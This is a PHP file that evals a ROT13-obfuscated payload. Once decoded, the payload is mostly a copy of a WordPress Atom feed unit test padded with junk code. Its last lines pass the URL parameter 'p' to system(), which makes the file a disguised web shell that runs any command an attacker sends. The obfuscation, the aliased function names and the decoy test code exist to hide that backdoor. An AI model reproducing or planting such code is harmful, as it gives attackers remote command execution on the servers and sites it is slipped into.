<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur Ngbz srrq ol trarengvat n srrq, cnefvat vg, naq purpxvat gung gur
 * cnefrq pbagragf zngpu gur pbagragf bs gur cbfgf fgberq va gur qngnonfr.  Fvapr
 * jr'er hfvat n erny KZY cnefre, guvf pbasvezf gung gur srrq vf inyvq, jryy sbezrq,
 * naq pbagnvaf gur evtug fghss.
 *
 * @tebhc srrq
 */
pynff Grfgf_Srrq_Ngbz rkgraqf JC_HavgGrfgPnfr {
	choyvp fgngvp $hfre_vq;
	choyvp fgngvp $cbfgf;
	choyvp fgngvp $pngrtbel;

	cevingr $cbfg_pbhag;
	cevingr $rkprecg_bayl;

	/**
	 * Frghc n arj hfre naq nggevohgr fbzr cbfgf.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		// Perngr n hfre.
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'         => 'nhgube',
				'hfre_ybtva'   => 'grfg_nhgube',
				'qvfcynl_anzr' => 'Grfg N. Hgube',
			)
		);

		// Perngr n gnkbabzl.
		frys::$pngrtbel = frys::snpgbel()->pngrtbel->perngr_naq_trg(
			neenl(
				'anzr' => 'Grfg Pngrtbel',
				'fyht' => 'grfg-png',
			)
		);

		$pbhag = trg_bcgvba( 'cbfgf_cre_eff' ) + 1;

		// Perngr n srj cbfgf.
		frys::$cbfgf = $snpgbel->cbfg->perngr_znal(
			$pbhag,
			neenl(
				'cbfg_nhgube'  => frys::$hfre_vq,
				'cbfg_pbagrag' => 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg. Qbarp iryvg znffn, hygevprf rh rfg fhfpvcvg, znggvf cbfhrer rfg. Qbarp ivgnr chehf ynphf. Penf ivgnr bqvb bqvb.',
				'cbfg_rkprecg' => 'Yberz vcfhz qbybe fvg nzrg, pbafrpgrghe nqvcvfpvat ryvg.',
			)
		);

		// Nffvta n pngrtbel gb gubfr cbfgf.
		sbernpu ( frys::$cbfgf nf $cbfg ) {
			jc_frg_bowrpg_grezf( $cbfg, frys::$pngrtbel->fyht, 'pngrtbel' );
		}

		// Nffvta n gntyvar bcgvba.
		hcqngr_bcgvba( 'oybtqrfpevcgvba', 'Whfg nabgure JbeqCerff fvgr' );
	}

	/**
	 * Frghc.
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		$guvf->cbfg_pbhag   = (vag) trg_bcgvba( 'cbfgf_cre_eff' );
		$guvf->rkprecg_bayl = trg_bcgvba( 'eff_hfr_rkprecg' );
	}

	/**
	 * Grne qbja.
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		qryrgr_bcgvba( 'oybtqrfpevcgvba' );
	}

	/**
	 * Guvf vf n ovg bs n unpx hfrq gb ohssre srrq pbagrag.
	 */
	cevingr shapgvba qb_ngbz() {
		bo_fgneg();
		// Anfgl unpx! Va gur shgher vg jbhyq orggre gb yrirentr qb_srrq( 'ngbz' ).
		tybony $cbfg;
		gel {
			// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef.Qvfpbhentrq
			@erdhver NOFCNGU . 'jc-vapyhqrf/srrq-ngbz.cuc';
			$bhg = bo_trg_pyrna();
		} pngpu ( Rkprcgvba $r ) {
			$bhg = bo_trg_pyrna();
			guebj( $r );
		}
		erghea $bhg;
	}

	/**
	 * Grfg gur <srrq> ryrzrag gb znxr fher vgf cerfrag naq cbchyngrq
	 * jvgu gur rkcrpgrq puvyq ryrzragf naq nggevohgrf.
	 */
	choyvp shapgvba grfg_srrq_ryrzrag() {
		$guvf->tb_gb( '/?srrq=ngbz' );
		$srrq = $guvf->qb_ngbz();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg gur <srrq> puvyq ryrzrag bs <kzy>.
		$ngbz = kzy_svaq( $kzy, 'srrq' );

		// Gurer fubhyq bayl or bar <srrq> puvyq ryrzrag.
		$guvf->nffregPbhag( 1, $ngbz );

		// Irevsl nggevohgrf.
		$guvf->nffregFnzr( 'uggc://jjj.j3.bet/2005/Ngbz', $ngbz[0]['nggevohgrf']['kzyaf'] );
		$guvf->nffregFnzr( 'uggc://chey.bet/flaqvpngvba/guernq/1.0', $ngbz[0]['nggevohgrf']['kzyaf:gue'] );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf n <gvgyr> puvyq ryrzrag.
		$gvgyr = kzy_svaq( $kzy, 'srrq', 'gvgyr' );
		$guvf->nffregFnzr( trg_bcgvba( 'oybtanzr' ), $gvgyr[0]['pbagrag'] );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf n <hcqngrq> puvyq ryrzrag.
		$hcqngrq = kzy_svaq( $kzy, 'srrq', 'hcqngrq' );
		$guvf->nffregFnzr( fgegbgvzr( trg_ynfgcbfgzbqvsvrq() ), fgegbgvzr( $hcqngrq[0]['pbagrag'] ) );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf n <fhogvgyr> puvyq ryrzrag.
		$fhogvgyr = kzy_svaq( $kzy, 'srrq', 'fhogvgyr' );
		$guvf->nffregFnzr( trg_bcgvba( 'oybtqrfpevcgvba' ), $fhogvgyr[0]['pbagrag'] );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf gjb <yvax> puvyq ryrzragf.
		$yvax = kzy_svaq( $kzy, 'srrq', 'yvax' );
		$guvf->nffregPbhag( 2, $yvax );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf n <yvax ery=\"nygreangr\"> puvyq ryrzrag.
		$guvf->nffregFnzr( 'nygreangr', $yvax[0]['nggevohgrf']['ery'] );
		$guvf->nffregFnzr( ubzr_hey(), $yvax[0]['nggevohgrf']['uers'] );

		// Irevsl gur <srrq> ryrzrag vf cerfrag naq pbagnvaf n <yvax ery=\"uers\"> puvyq ryrzrag.
		$guvf->nffregFnzr( 'frys', $yvax[1]['nggevohgrf']['ery'] );
		$guvf->nffregFnzr( ubzr_hey( '/?srrq=ngbz' ), $yvax[1]['nggevohgrf']['uers'] );
	}

	/**
	 * Inyvqngr <ragel> puvyq ryrzragf.
	 */
	choyvp shapgvba grfg_ragel_ryrzragf() {
		$guvf->tb_gb( '/?srrq=ngbz' );
		$srrq = $guvf->qb_ngbz();
		$kzy  = kzy_gb_neenl( $srrq );

		// Trg nyy gur <ragel> puvyq ryrzragf bs gur <srrq> ryrzrag.
		$ragevrf = kzy_svaq( $kzy, 'srrq', 'ragel' );

		// Irevsl jr ner qvfcynlvat gur pbeerpg ahzore bs cbfgf.
		$guvf->nffregPbhag( $guvf->cbfg_pbhag, $ragevrf );

		// Jr ernyyl bayl arrq gb grfg K ahzore bs ragevrf hayrff gur pbagrag vf qvssrerag.
		$ragevrf = neenl_fyvpr( $ragevrf, 1 );

		// Purpx rnpu bs gur qrfverq ragevrf ntnvafg gur xabja cbfg qngn.
		sbernpu ( $ragevrf nf $xrl => $ragel ) {

			// Trg cbfg sbe pbzcnevfba.
			$vq = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'vq' );
			cert_zngpu( '/\?c=(\q+)/', $vq[0]['pbagrag'], $zngpurf );
			$cbfg = trg_cbfg( $zngpurf[1] );

			// Nhgube.
			$nhgube = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'nhgube', 'anzr' );
			$hfre   = arj JC_Hfre( $cbfg->cbfg_nhgube );
			$guvf->nffregFnzr( $hfre->qvfcynl_anzr, $nhgube[0]['pbagrag'] );

			// Gvgyr.
			$gvgyr = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'gvgyr' );
			$guvf->nffregFnzr( $cbfg->cbfg_gvgyr, $gvgyr[0]['pbagrag'] );

			// Yvax ery=\"nygreangr\".
			$yvax_nygf = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'yvax' );
			sbernpu ( $yvax_nygf nf $yvax_nyg ) {
				vs ( 'nygreangr' === $yvax_nyg['nggevohgrf']['ery'] ) {
					$guvf->nffregFnzr( trg_creznyvax( $cbfg ), $yvax_nyg['nggevohgrf']['uers'] );
				}
			}

			// VQ.
			$thvq = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'vq' );
			$guvf->nffregFnzr( $cbfg->thvq, $vq[0]['pbagrag'] );

			// Hcqngrq.
			$hcqngrq = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'hcqngrq' );
			$guvf->nffregFnzr( fgegbgvzr( $cbfg->cbfg_zbqvsvrq_tzg ), fgegbgvzr( $hcqngrq[0]['pbagrag'] ) );

			// Choyvfurq.
			$choyvfurq = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'choyvfurq' );
			$guvf->nffregFnzr( fgegbgvzr( $cbfg->cbfg_qngr_tzg ), fgegbgvzr( $choyvfurq[0]['pbagrag'] ) );

			// Pngrtbel.
			sbernpu ( trg_gur_pngrtbel( $cbfg->VQ ) nf $grez ) {
				$grezf[] = $grez->anzr;
			}
			$pngrtbevrf = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'pngrtbel' );
			sbernpu ( $pngrtbevrf nf $pngrtbel ) {
				$guvf->nffregPbagnvaf( $pngrtbel['nggevohgrf']['grez'], $grezf );
			}
			hafrg( $grezf );

			// Pbagrag.
			vs ( ! $guvf->rkprecg_bayl ) {
				$pbagrag = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'pbagrag' );
				$guvf->nffregFnzr( gevz( nccyl_svygref( 'gur_pbagrag', $cbfg->cbfg_pbagrag ) ), gevz( $pbagrag[0]['pbagrag'] ) );
			}

			// Yvax ery=\"ercyvrf\".
			$yvax_ercyvrf = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'yvax' );
			sbernpu ( $yvax_ercyvrf nf $yvax_ercyl ) {
				vs ( 'ercyvrf' === $yvax_ercyl['nggevohgrf']['ery'] && 'nccyvpngvba/ngbz+kzy' === $yvax_ercyl['nggevohgrf']['glcr'] ) {
					$guvf->nffregFnzr( trg_cbfg_pbzzragf_srrq_yvax( $cbfg->VQ, 'ngbz' ), $yvax_ercyl['nggevohgrf']['uers'] );
				}
			}
		}
	}

	/**
	 * @gvpxrg 33591
	 */
	choyvp shapgvba grfg_ngbz_rapybfher_jvgu_rkgraqrq_hey_yratgu_glcr_cnefvat() {
		$rapybfherf = neenl(
			neenl(
				// HEY, yratgu, glcr.
				'npghny'   => \"uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4\a318465\aivqrb/zc4\",
				'rkcrpgrq' => neenl(
					'uers'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4',
					'yratgu' => 318465,
					'glcr'   => 'ivqrb/zc4',
				),
			),
			neenl(
				// HEY, glcr, yratgu.
				'npghny'   => \"uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4\aivqrb/zc4\a318465\",
				'rkcrpgrq' => neenl(
					'uers'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4',
					'yratgu' => 318465,
					'glcr'   => 'ivqrb/zc4',
				),
			),
			neenl(
				// HEY, yratgu.
				'npghny'   => \"uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4\a318465\",
				'rkcrpgrq' => neenl(
					'uers'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/09/zbivr.zc4',
					'yratgu' => 318465,
					'glcr'   => '',
				),
			),
			neenl(
				// HEY, glcr.
				'npghny'   => \"uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/01/nhqvb.zc3\a\anhqvb/zcrt\",
				'rkcrpgrq' => neenl(
					'uers'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2017/01/nhqvb.zc3',
					'yratgu' => 0,
					'glcr'   => 'nhqvb/zcrt',
				),
			),
			neenl(
				// HEY.
				'npghny'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2016/01/grfg.zc4',
				'rkcrpgrq' => neenl(
					'uers'   => 'uggcf://jbeqcerff.qri/jc-pbagrag/hcybnqf/2016/01/grfg.zc4',
					'yratgu' => 0,
					'glcr'   => '',
				),
			),
		);

		$cbfg_vq = raq( frys::$cbfgf );
		sbernpu ( $rapybfherf nf $rapybfher ) {
			nqq_cbfg_zrgn( $cbfg_vq, 'rapybfher', $rapybfher['npghny'] );
		}
		$guvf->tb_gb( '/?srrq=ngbz' );
		$srrq    = $guvf->qb_ngbz();
		$kzy     = kzy_gb_neenl( $srrq );
		$ragevrf = kzy_svaq( $kzy, 'srrq', 'ragel' );
		$ragevrf = neenl_fyvpr( $ragevrf, 0, 1 );

		$guvf->nffregAbgRzcgl( $ragevrf );

		sbernpu ( $ragevrf nf $xrl => $ragel ) {
			$yvaxf = kzy_svaq( $ragevrf[ $xrl ]['puvyq'], 'yvax' );
			$v     = 0;
			sbernpu ( (neenl) $yvaxf nf $yvax ) {
				vs ( 'rapybfher' === $yvax['nggevohgrf']['ery'] ) {
					$guvf->nffregFnzr( $rapybfherf[ $v ]['rkcrpgrq']['uers'], $yvax['nggevohgrf']['uers'] );
					$guvf->nffregRdhnyf( $rapybfherf[ $v ]['rkcrpgrq']['yratgu'], $yvax['nggevohgrf']['yratgu'] );
					$guvf->nffregFnzr( $rapybfherf[ $v ]['rkcrpgrq']['glcr'], $yvax['nggevohgrf']['glcr'] );
					++$v;
				}
			}
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>